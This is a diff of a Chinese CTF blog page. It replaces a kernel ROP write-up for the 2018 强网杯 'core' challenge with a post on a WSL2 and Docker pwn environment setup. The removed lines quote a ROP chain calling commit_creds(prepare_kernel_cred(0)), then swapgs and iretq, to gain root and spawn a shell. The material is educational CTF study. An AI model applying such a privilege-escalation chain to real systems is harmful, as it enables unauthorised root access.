@@ -16,24 +16,24 @@
   <meta name="author" content="Hush">
   <meta name="keywords" content="">
   
-    <meta name="description" content="初学kernel，做个笔记。 Kernel ROP - CTF Wiki wiki上有着详细的分析，这里只对一些wiki上没有讲到的做个笔记。 首先是对文件: 引用一句其他师傅的话：类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的（start.sh 中修改）。 Rop大体思路栈上有Canary防护的话，需要先泄露出Can">
+    <meta name="description" content="为什么使用Docker+WSL2docker可以让我们的环境配置更加简单。 WSL2则提供更快速的Linux服务。 你也不想启动一个虚拟机等半天，让虚拟机关机也等半天吧？ 其次就是，WSL没有图形化的界面。可以更好让锻炼用户，让用户记下一些常用命令。 而且只用命令行来操作计算机可以让你看起来更像一个黑客（程序员） 配置Docker+WSL2网上教程很多，在这里不多阐述。 重点是最好使用Docker">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kernel_ROP-2018_强网杯-core">
-<meta property="og:url" content="https://hushs1gnal.github.io/2022/05/19/kernelROP-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/index.html">
+<meta property="og:title" content="首次实战WSL+Docker">
+<meta property="og:url" content="https://hushs1gnal.github.io/2022/05/24/wsltest/index.html">
 <meta property="og:site_name" content="Hush&#39;blog">
-<meta property="og:description" content="初学kernel，做个笔记。 Kernel ROP - CTF Wiki wiki上有着详细的分析，这里只对一些wiki上没有讲到的做个笔记。 首先是对文件: 引用一句其他师傅的话：类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的（start.sh 中修改）。 Rop大体思路栈上有Canary防护的话，需要先泄露出Can">
+<meta property="og:description" content="为什么使用Docker+WSL2docker可以让我们的环境配置更加简单。 WSL2则提供更快速的Linux服务。 你也不想启动一个虚拟机等半天，让虚拟机关机也等半天吧？ 其次就是，WSL没有图形化的界面。可以更好让锻炼用户，让用户记下一些常用命令。 而且只用命令行来操作计算机可以让你看起来更像一个黑客（程序员） 配置Docker+WSL2网上教程很多，在这里不多阐述。 重点是最好使用Docker">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hushs1gnal.github.io/img/hello5.jpg">
-<meta property="article:published_time" content="2022-05-19T11:48:38.000Z">
-<meta property="article:modified_time" content="2022-05-24T05:50:28.046Z">
+<meta property="og:image" content="https://hushs1gnal.github.io/img/hello.jpg">
+<meta property="article:published_time" content="2022-05-24T10:27:29.475Z">
+<meta property="article:modified_time" content="2022-05-24T11:03:46.476Z">
 <meta property="article:author" content="Hush">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello5.jpg">
+<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello.jpg">
   
   
   
-  <title>kernel_ROP-2018_强网杯-core - Hush&#39;blog</title>
+  <title>首次实战WSL+Docker - Hush&#39;blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -184,7 +184,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="kernel_ROP-2018_强网杯-core"></span>
+            <span id="subtitle" data-typed-text="首次实战WSL+Docker"></span>
           
         </div>
 
@@ -195,8 +195,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-05-19 19:48" pubdate>
-          2022年5月19日 晚上
+        <time datetime="2022-05-24 18:27" pubdate>
+          2022年5月24日 晚上
         </time>
       </span>
     
@@ -207,7 +207,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          2k 字
         
       </span>
     
@@ -247,28 +247,98 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">kernel_ROP-2018_强网杯-core</h1>
+            <h1 style="display: none">首次实战WSL+Docker</h1>
             
             <div class="markdown-body">
               
-              <p>初学kernel，做个笔记。</p>
-<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#_1">Kernel ROP - CTF Wiki</a></p>
-<p>wiki上有着详细的分析，这里只对一些wiki上没有讲到的做个笔记。</p>
-<p>首先是对文件:</p>
-<p>引用一句其他师傅的话：类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的（start.sh 中修改）。</p>
-<h1 id="Rop大体思路"><a href="#Rop大体思路" class="headerlink" title="Rop大体思路"></a>Rop大体思路</h1><p>栈上有Canary防护的话，需要先泄露出Canary，来促使Rop</p>
-<p>Rop具体思路是和Libc中的类似，利用一些寄存器进行传值</p>
-<p>调用commit_creds(prepare_kernel_cred(0))来提权</p>
-<p>最后回到用户态就可以system(‘bin&#x2F;sh’)</p>
-<p>思路是很好想的，但是具体是shellcode的写法。</p>
-<p>我们ropper出来的gadget中一部分是不能用的，而且也不是每次都能找到完美适合的gadget，这就比较考验我们写shellcode的功底。</p>
-<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>拿wiki上的shellcode来分析</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">rop[i++] = <span class="hljs-number">0</span>xffffffff81000b2f + offset; <span class="hljs-regexp">//</span> pop rdi; ret<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = prepare_kernel_cred;         <span class="hljs-regexp">//</span> prepare_kernel_cred(<span class="hljs-number">0</span>)<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff810a0f49 + offset; <span class="hljs-regexp">//</span> pop rdx; ret<br>rop[i++] = <span class="hljs-number">0</span>xffffffff81021e53 + offset; <span class="hljs-regexp">//</span> pop rcx; ret<br>rop[i++] = <span class="hljs-number">0</span>xffffffff8101aa6a + offset; <span class="hljs-regexp">//</span> mov rdi, rax; call rdx; <br>rop[i++] = commit_creds;<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff81a012da + offset; <span class="hljs-regexp">//</span> swapgs; popfq; ret<br>rop[i++] = <span class="hljs-number">0</span>;<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff81050ac2 + offset; <span class="hljs-regexp">//</span> iretq; ret; <br><br>rop[i++] = (size_t)spawn_shell;         <span class="hljs-regexp">//</span> rip <br><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br><br>并且因为执行了mov rdi ，ra<br></code></pre></td></tr></table></figure>
+              <h1 id="为什么使用Docker-WSL2"><a href="#为什么使用Docker-WSL2" class="headerlink" title="为什么使用Docker+WSL2"></a>为什么使用Docker+WSL2</h1><p>docker可以让我们的环境配置更加简单。</p>
+<p>WSL2则提供更快速的Linux服务。</p>
+<p>你也不想启动一个虚拟机等半天，让虚拟机关机也等半天吧？</p>
+<p>其次就是，WSL没有图形化的界面。可以更好让锻炼用户，让用户记下一些常用命令。</p>
+<p>而且只用命令行来操作计算机可以让你看起来更像一个黑客（程序员）</p>
+<h1 id="配置Docker-WSL2"><a href="#配置Docker-WSL2" class="headerlink" title="配置Docker+WSL2"></a>配置Docker+WSL2</h1><p>网上教程很多，在这里不多阐述。</p>
+<p>重点是最好使用Docker4.4.4。</p>
+<p>其他版本总是出现Docker stopped 等错误。</p>
+<h1 id="下载PWN镜像"><a href="#下载PWN镜像" class="headerlink" title="下载PWN镜像"></a>下载PWN镜像</h1><p><a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80">参考博客</a></p>
+<p>以下操作可在WSL中完成</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull skysider/pwndocker<br></code></pre></td></tr></table></figure>
 
-<p>x(rax一般作为返回值寄存器)rdi作为参数传递。然后swapgs 恢复寄存器的值，再用iretq 跳回用户态，这样就利用.ko文件的漏洞当前这个进程提权了，再进行system(‘bin&#x2F;sh’)就ok了</p>
-<p>&#96;rop[i++] &#x3D; 0xffffffff81000b2f + offset; &#x2F;&#x2F; pop rdi; ret<br>rop[i++] &#x3D; 0;<br>rop[i++] &#x3D; prepare_kernel_cred;         &#x2F;&#x2F; prepare_kernel_cred(0)</p>
-<p>rop[i++] &#x3D; 0xffffffff810a0f49 + offset; &#x2F;&#x2F; pop rdx; ret<br>rop[i++] &#x3D; 0xffffffff81021e53 + offset; &#x2F;&#x2F; pop rcx; ret<br>rop[i++] &#x3D; 0xffffffff8101aa6a + offset; &#x2F;&#x2F; mov rdi, rax; call rdx;<br>rop[i++] &#x3D; commit_creds;&#96;</p>
-<p>这部分的栈操作我分析了半个小时，shellcode功底并不好，后续还需要继续学习。原因是把call指令记错了。call 指令会先把当前的rip压入栈中，然后在进行jmp。这样在call rdx ，rdx再去执行pop rcx ；ret；时，ret就可以执行commit_creds 。如果 没有push操作，就会把commit_creds pop给了rcx，产生错误的理解。</p>
+<p>下载最新版（最新版只含python3）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>1.0版本，有python2</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">docker <span class="hljs-keyword">tag</span> <span class="hljs-title">registry</span>.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:<span class="hljs-number">1.0</span> skysider/pwndocker<br></code></pre></td></tr></table></figure>
+
+<p>改名</p>
+<h1 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h1><p>先写一个sh脚本，方便我们操作使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d \<br>	--rm \<br>	-h $&#123;ctf_name&#125; \<br>	--name $&#123;ctf_name&#125; \<br>	-v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \<br>	-p 23946:23946 \<br>	--cap-add=SYS_PTRACE \<br>	skysider/pwndocker<br><br></code></pre></td></tr></table></figure>
+
+<p>我保存为了pwndk.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./pwndk.sh<br></code></pre></td></tr></table></figure>
+
+<p>返回容器的ID</p>
+<p><img src="/img/wsl-1.png" srcset="/img/loading.gif" lazyload alt="wsl-1"></p>
+<p>成功。</p>
+<h1 id="WSL与Windows文件共享"><a href="#WSL与Windows文件共享" class="headerlink" title="WSL与Windows文件共享"></a>WSL与Windows文件共享</h1><h3 id="网络上共享文件"><a href="#网络上共享文件" class="headerlink" title="网络上共享文件"></a>网络上共享文件</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43707486/article/details/121651313?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165338957616781435493157%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165338957616781435493157&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121651313-null-null.142%5Ev10%5Econtrol,157%5Ev12%5Econtrol&utm_term=wsl%E5%A4%8D%E5%88%B6windows%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6&spm=1018.2226.3001.4187">参考文档</a></p>
+<p>但我的机器上并不能在网络上找到WSL，很奇怪</p>
+<h3 id="cp-x2F-mnt"><a href="#cp-x2F-mnt" class="headerlink" title="cp &#x2F;mnt"></a>cp &#x2F;mnt</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-regexp">/mnt/</span>c/****   .<br></code></pre></td></tr></table></figure>
+
+<p>注意 这行代码最后的.</p>
+<p>.  代表当前文件将，将目标文件夹下的文件复制到当前文件夹下。</p>
+<h1 id="Pwngdb调试"><a href="#Pwngdb调试" class="headerlink" title="Pwngdb调试"></a>Pwngdb调试</h1><p>有两种方法</p>
+<h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p>在脚本开头加入</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">context.terminal</span> = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;sp&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+<p>注：</p>
+<p>得提前在终端启动tmux。</p>
+<p>否则python会提示</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">Traceback (most recent call last):<br>File “exp.py”, line <span class="hljs-number">4</span>, <span class="hljs-keyword">in</span><br>gdb.attach§<br>File “/home/ /pwn/pwn/lib/python3<span class="hljs-number">.8</span>/site-packages/pwnlib/context/init.py”, line <span class="hljs-number">1543</span>, <span class="hljs-keyword">in</span> setter<br><span class="hljs-keyword">return</span> function(*a, **kw)<br>File “/home/ /pwn/pwn/lib/python3<span class="hljs-number">.8</span>/site-packages/pwnlib/gdb.py”, line <span class="hljs-number">1051</span>, <span class="hljs-keyword">in</span> attach<br>gdb_pid = misc.run_in_new_terminal(cmd, preexec_fn = preexec_fn)<br>File “/home/ /pwn/pwn/lib/python3<span class="hljs-number">.8</span>/site-packages/pwnlib/util/misc.py”, line <span class="hljs-number">303</span>, <span class="hljs-keyword">in</span> run_in_new_terminal<br>pid = <span class="hljs-built_in">int</span>(out)<br>ValueError: invalid literal <span class="hljs-keyword">for</span> <span class="hljs-built_in">int</span>() <span class="hljs-keyword">with</span> base <span class="hljs-number">10</span>: b’’<br></code></pre></td></tr></table></figure>
+
+<p>最终即可分屏，左半部分exp的互动，右半部分为gdb调试。</p>
+<p><img src="/img/wsl-3.png" srcset="/img/loading.gif" lazyload alt="wsl-3"></p>
+<p>按Q退出gdb。</p>
+<p>再按Ctrl+D退出tmux</p>
+<h3 id="gdb连接"><a href="#gdb连接" class="headerlink" title="gdb连接"></a>gdb连接</h3><p>exp.py脚本中不要写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">gdb.attach(p)<br></code></pre></td></tr></table></figure>
+
+<p>末尾加上</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.interactive</span>()<br></code></pre></td></tr></table></figure>
+
+<p>运行后得到PID号</p>
+<p><img src="/img/wsl-2.png" srcset="/img/loading.gif" lazyload alt="wsl-2"></p>
+<p>提前开启一个终端，运行相同id的docker。</p>
+<p>在另一个docker中输入</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">gdb.attach<span class="hljs-comment">(PID)</span><br></code></pre></td></tr></table></figure>
+
+<p>就可以两个终端进行调试</p>
+<h1 id="python3的错误提示"><a href="#python3的错误提示" class="headerlink" title="python3的错误提示"></a>python3的错误提示</h1><p>经常会提示byte和text之间的问题。</p>
+<p>最好的解决方法就是，在形如‘’的字符串前加入b</p>
+<p>例如</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x410,b<span class="hljs-string">&#x27;aaaa&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure>
+
+<p>其余的还没遇到，遇到了再说。</p>
+<h1 id="Vim基础操作"><a href="#Vim基础操作" class="headerlink" title="Vim基础操作"></a>Vim基础操作</h1><p>首先就是  命令模式输入I，进入插入模式等等的基础操作。</p>
+<p>只写一些常见的问题</p>
+<p>习惯了Windows下的记事本，保存的时候经常按下 Ctrl + s 保存文本</p>
+<p>这会导致<strong>会阻塞所有的输入，解决方式为CTRL+q</strong></p>
+<p>其次就是文本内复制</p>
+<p>按下ESC进入命令模式，按下<strong>yy</strong></p>
+<p>然后移动光标到想要复制到的地方，按下<strong>q</strong></p>
+<p>就可以复制</p>
+<p>多行复制的话，可以y+n(小键盘上的数字)</p>
+<p>这种多行操作在vim很常见</p>
+<h1 id="WSL尚未解决的问题"><a href="#WSL尚未解决的问题" class="headerlink" title="WSL尚未解决的问题"></a>WSL尚未解决的问题</h1><p>本人WSL配置的很奇怪。网上也没有查到相似的案例。</p>
+<p>开机如果不是第一时间启动WSL。</p>
+<p>过一段时间启动就会提示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wsl某项操作曾尝试在降级对象上进行。<br></code></pre></td></tr></table></figure>
+
+<p>然后退出。</p>
+<p>解决方法目前尚未找到。</p>
+<p>网上的NoLsp方法尝试了也无法使用</p>
+<p>唯一有用的就是</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netsh winsock reset</span><br></code></pre></td></tr></table></figure>
+
+<p>然后重启电脑</p>
 
               
             </div>
@@ -291,10 +361,40 @@
   
     <span>></span>
     
-  <a href="/categories/Pwn/kernel/" class="category-chain-item">kernel</a>
+  <a href="/categories/Pwn/base/" class="category-chain-item">base</a>
   
   
 
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux/" class="category-chain-item">Linux</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Docker/" class="category-chain-item">Docker</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WSL/" class="category-chain-item">WSL</a>
+  
   
 
       </span>
@@ -320,8 +420,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>kernel_ROP-2018_强网杯-core</div>
-      <div>https://hushs1gnal.github.io/2022/05/19/kernelROP-2018强网杯-core/</div>
+      <div>首次实战WSL+Docker</div>
+      <div>https://hushs1gnal.github.io/2022/05/24/wsltest/</div>
     </div>
     <div class="license-meta">
       
@@ -333,7 +433,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年5月19日</div>
+          <div>2022年5月24日</div>
         </div>
       
       
@@ -363,18 +463,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/05/24/wsltest/" title="首次实战WSL+Docker">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">首次实战WSL+Docker</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/05/17/Pwncollege_shellocode_1/" title="PwnCollege_shellcode第一章">
-                        <span class="hidden-mobile">PwnCollege_shellcode第一章</span>
+                      <a href="/2022/05/19/kernelROP-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/" title="kernel_ROP-2018_强网杯-core">
+                        <span class="hidden-mobile">kernel_ROP-2018_强网杯-core</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
